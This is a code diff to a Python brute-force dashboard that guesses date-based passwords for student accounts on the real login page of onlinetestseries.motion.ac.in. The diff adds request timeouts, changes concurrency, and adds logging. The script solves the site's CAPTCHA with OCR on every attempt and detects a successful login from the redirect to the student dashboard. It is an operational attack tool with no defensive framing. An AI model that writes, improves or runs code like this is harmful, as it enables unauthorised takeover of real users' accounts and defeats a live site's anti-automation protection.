@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Motion OTS Brute‑Force Dashboard – Full Implementation with Live Logging
+Motion OTS Brute‑Force Dashboard – Fixed with Timeouts & Detailed Logging
 Author: Potato
 """
 
@@ -160,10 +160,11 @@ class BruteJob:
         total = len(dates)
         log_queue.put_nowait(f"🚀 Starting brute‑force for {user_id} over {year} ({total} passwords)")
 
-        # Lower concurrency to avoid memory issues
-        connector = aiohttp.TCPConnector(limit=10, limit_per_host=10)
-        async with aiohttp.ClientSession(connector=connector) as session:
-            semaphore = asyncio.Semaphore(10)
+        # Lower concurrency to 5 to avoid overloading
+        connector = aiohttp.TCPConnector(limit=5, limit_per_host=5)
+        timeout = aiohttp.ClientTimeout(total=15, connect=10)
+        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+            semaphore = asyncio.Semaphore(5)
             result_queue = asyncio.Queue()
             stop_event = asyncio.Event()
 
@@ -212,14 +213,14 @@ class BruteJob:
         async with semaphore:
             log_queue.put_nowait(f"⏳ Attempting {password}")
             try:
-                # Step 1: Fetch CAPTCHA
+                # Step 1: Fetch CAPTCHA with timeout
                 captcha = await self._fetch_captcha(session, log_queue)
                 if not captcha:
                     log_queue.put_nowait(f"⏭️ Skipping {password} – CAPTCHA not obtained.")
                     return
                 log_queue.put_nowait(f"🔑 Trying {password} with CAPTCHA {captcha}")
 
-                # Step 2: Login attempt
+                # Step 2: Login attempt with timeout
                 success, response = await self._try_login(session, user_id, password, captcha)
                 if success:
                     log_queue.put_nowait(f"✅ SUCCESS! Password = {password}")
@@ -227,7 +228,6 @@ class BruteJob:
                     stop_event.set()
                     return
 
-                # Handle CAPTCHA errors
                 if response == "captcha_error":
                     log_queue.put_nowait("🔄 CAPTCHA wrong, retrying with new image...")
                     try:
@@ -241,14 +241,12 @@ class BruteJob:
                                 return
                     except Exception as e:
                         log_queue.put_nowait(f"⚠️ Retry CAPTCHA error: {e}")
-                else:
-                    # Login failed for other reasons (wrong password)
-                    # We don't log every failure to avoid clutter, but we could if needed
-                    pass
-
+                # else: login failed (wrong password) – we don't log every failure to avoid clutter
+            except asyncio.TimeoutError:
+                log_queue.put_nowait(f"⏰ Timeout for {password}")
             except Exception as e:
-                log_queue.put_nowait(f"❌ Worker error for {password}: {str(e)}\n{traceback.format_exc()}")
-            await asyncio.sleep(0.05)
+                log_queue.put_nowait(f"❌ Worker error for {password}: {str(e)}")
+            await asyncio.sleep(0.1)
 
     async def _fetch_captcha(self, session, log_queue):
         for attempt in range(3):
@@ -256,9 +254,14 @@ class BruteJob:
                 rand = int(time.time() * 1000) + attempt + os.getpid()
                 url = f"https://onlinetestseries.motion.ac.in/captcha.php?rand={rand}"
                 log_queue.put_nowait(f"📸 Fetching CAPTCHA (attempt {attempt+1})")
-                async with session.get(url) as resp:
+                # Use a short timeout for the CAPTCHA request
+                async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+                    log_queue.put_nowait(f"📥 CAPTCHA response: HTTP {resp.status}")
                     if resp.status == 200:
                         img_bytes = await resp.read()
+                        if len(img_bytes) < 100:
+                            log_queue.put_nowait("⚠️ CAPTCHA image too small, possibly invalid.")
+                            continue
                         loop = asyncio.get_running_loop()
                         captcha = await loop.run_in_executor(None, solve_captcha_image, img_bytes, log_queue)
                         if captcha:
@@ -268,9 +271,11 @@ class BruteJob:
                             log_queue.put_nowait("⚠️ OCR returned empty result")
                     else:
                         log_queue.put_nowait(f"⚠️ CAPTCHA HTTP {resp.status}")
+            except asyncio.TimeoutError:
+                log_queue.put_nowait("⏰ CAPTCHA request timed out (10s)")
             except Exception as e:
                 log_queue.put_nowait(f"⚠️ CAPTCHA fetch error: {str(e)}")
-            await asyncio.sleep(0.2)
+            await asyncio.sleep(0.5)
         log_queue.put_nowait("❌ Failed to get CAPTCHA after 3 attempts")
         return None
 
@@ -289,7 +294,8 @@ class BruteJob:
         }
         try:
             async with session.post("https://onlinetestseries.motion.ac.in/login.php",
-                                    data=data, headers=headers, allow_redirects=False) as resp:
+                                    data=data, headers=headers, allow_redirects=False,
+                                    timeout=aiohttp.ClientTimeout(total=10)) as resp:
                 if resp.status == 302:
                     location = resp.headers.get("Location", "")
                     if "dashboard/student-dashboard.php" in location:
@@ -302,6 +308,8 @@ class BruteJob:
                         return False, "captcha_error"
                     return False, text
                 return False, f"HTTP {resp.status}"
+        except asyncio.TimeoutError:
+            raise Exception("Login request timed out")
         except Exception as e:
             raise Exception(f"Login request failed: {str(e)}")
 
@@ -638,7 +646,6 @@ def list_jobs():
             })
         return jsonify({'jobs': jobs_list})
 
-# ---------- Tesseract Test Route ----------
 @app.route('/test-tesseract')
 def test_tesseract():
     import subprocess
